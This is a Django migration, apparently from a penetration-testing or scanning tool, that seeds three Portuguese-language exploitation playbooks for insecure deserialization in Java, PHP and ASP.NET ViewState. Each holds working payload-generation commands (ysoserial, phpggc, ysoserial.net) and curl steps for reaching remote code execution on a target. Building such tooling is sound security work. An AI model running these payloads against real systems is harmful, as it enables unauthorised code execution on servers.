# Semeia os playbooks das 3 classes de desserialização insegura (Fase C5):
# objeto Java serializado (cookie 'rememberMe' do Shiro ou genérico), PHP
# Object Injection e ASP.NET ViewState sem criptografia explícita.
# Mesmo padrão de 0013_seed_phase_c3_playbooks.py.

from django.db import migrations

OWASP_2021 = "https://owasp.org/Top10/"
OWASP_2025 = "https://owasp.org/Top10/2025/"

PLAYBOOKS = [
    {
        "key": "integrity.java-deserialization",
        "category": "integrity",
        "vuln_class": "Desserialização insegura (Java)",
        "title": "Explorando um objeto Java serializado via gadget chain",
        "summary": (
            "Um cookie/parâmetro com objeto Java serializado (assinatura "
            "AC ED 00 05) sugere que o backend desserializa dados do "
            "cliente nativamente — se uma biblioteca com gadget chain "
            "conhecida (Commons Collections, Spring, Shiro) estiver no "
            "classpath, um objeto malicioso gerado com ysoserial executa "
            "código remoto na desserialização."
        ),
        "prerequisites": "Cookie/parâmetro com objeto Java serializado; biblioteca com gadget chain no classpath.",
        "steps": [
            {
                "action": "Gerar um payload RCE com ysoserial para a gadget chain testada",
                "command": "java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0",
                "expected": "Payload Base64 pronto para substituir o valor do cookie/parâmetro.",
            },
            {
                "action": "Reenviar a requisição com o payload no lugar do valor original",
                "command": 'curl -sk "{url}" -H "Cookie: {param}=<payload base64>"',
                "expected": "Execução do comando no servidor (confirmável por efeito observável/OOB).",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Identificar a gadget chain disponível",
                "impact": "info-disclosure",
                "description": "Testar cada gadget chain do ysoserial compatível com as libs do classpath.",
            },
            {
                "stage": "2. Execução remota de código",
                "impact": "rce",
                "description": "Gadget chain compatível executa comando arbitrário na desserialização.",
            },
        ],
        "max_impact": "rce",
        "tools": ["ysoserial", "Burp Suite", "curl"],
        "references": [
            OWASP_2021 + "A08_2021-Software_and_Data_Integrity_Failures/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://github.com/frohoff/ysoserial",
        ],
    },
    {
        "key": "integrity.php-object-injection",
        "category": "integrity",
        "vuln_class": "PHP Object Injection",
        "title": "Explorando unserialize() com uma gadget chain PHP (POP)",
        "summary": (
            "Um valor com a assinatura do serialize() nativo do PHP "
            '(O:<n>:"Classe":...) sugere que o backend passa dados do '
            "cliente a unserialize() — um objeto malicioso pode acionar "
            "métodos mágicos (__wakeup/__destruct/__toString) de classes "
            "disponíveis no autoload, encadeando uma Property-Oriented "
            "Programming (POP) chain até RCE/escrita de arquivo."
        ),
        "prerequisites": "Valor serializado PHP aceito de volta pelo servidor (cookie/parâmetro); classe com método mágico explorável disponível.",
        "steps": [
            {
                "action": "Identificar classes com métodos mágicos via código-fonte/composer.json vazado",
                "command": 'curl -sk "{url}/composer.json"',
                "expected": "Nome de bibliotecas com gadget chains POP conhecidas (ex.: Monolog, Guzzle).",
            },
            {
                "action": "Gerar o objeto malicioso com uma ferramenta de geração de gadget chain (ex.: PHPGGC)",
                "command": "phpggc Monolog/RCE1 system 'id' | base64 -w0",
                "expected": "Payload serializado pronto para substituir o valor original.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Acionar método mágico de classe arbitrária",
                "impact": "info-disclosure",
                "description": "__wakeup()/__destruct() executam código ao instanciar o objeto malicioso.",
            },
            {
                "stage": "2. Gadget chain até RCE",
                "impact": "rce",
                "description": "Encadear métodos de classes disponíveis (POP chain) até execução de comando/escrita de arquivo.",
            },
        ],
        "max_impact": "rce",
        "tools": ["PHPGGC", "Burp Suite", "curl"],
        "references": [
            OWASP_2021 + "A08_2021-Software_and_Data_Integrity_Failures/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://github.com/ambionics/phpggc",
        ],
    },
    {
        "key": "integrity.viewstate-exposed",
        "category": "integrity",
        "vuln_class": "ASP.NET ViewState sem proteção confirmada",
        "title": "Verificando e explorando ViewState sem MAC/criptografia",
        "summary": (
            "ViewState é o estado serializado (BinaryFormatter/LosFormatter) "
            "de uma página ASP.NET Web Forms. Sem EnableViewStateMac e "
            "criptografia, um atacante pode forjar um ViewState malicioso "
            "(via ysoserial.net) e obter RCE ao ser desserializado pelo "
            "servidor no postback."
        ),
        "prerequisites": "Campo __VIEWSTATE presente; EnableViewStateMac/criptografia desabilitados no servidor (verificar manualmente).",
        "steps": [
            {
                "action": "Confirmar se o MAC está realmente desabilitado (blacklist3r)",
                "command": "ysoserial.net --test --viewstate '<valor __VIEWSTATE>'",
                "expected": "Confirma se o ViewState é desserializável sem MAC válido.",
            },
            {
                "action": "Gerar e enviar um ViewState malicioso (se MAC confirmado ausente)",
                "command": "ysoserial.net -p ViewState -g TypeConfuseDelegate -c 'id' --generator=<...> --validationalg=<...> --validationkey=<...>",
                "expected": "Execução de comando no servidor ao processar o postback.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Confirmar MAC/criptografia desabilitados",
                "impact": "info-disclosure",
                "description": "blacklist3r/ysoserial.net testam se o ViewState aceita um valor forjado.",
            },
            {
                "stage": "2. Execução remota de código via ViewState forjado",
                "impact": "rce",
                "description": "ysoserial.net gera um ViewState que executa comando arbitrário ao ser desserializado.",
            },
        ],
        "max_impact": "rce",
        "tools": ["ysoserial.net", "blacklist3r", "Burp Suite"],
        "references": [
            OWASP_2021 + "A08_2021-Software_and_Data_Integrity_Failures/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://github.com/pwntester/ysoserial.net",
        ],
    },
]


def seed_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    for pb in PLAYBOOKS:
        ExploitationPlaybook.objects.update_or_create(
            key=pb["key"],
            defaults={k: v for k, v in pb.items() if k != "key"},
        )


def remove_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    ExploitationPlaybook.objects.filter(key__in=[p["key"] for p in PLAYBOOKS]).delete()


class Migration(migrations.Migration):

    dependencies = [
        ("scans", "0013_seed_phase_c3_playbooks"),
    ]

    operations = [migrations.RunPython(seed_playbooks, remove_playbooks)]
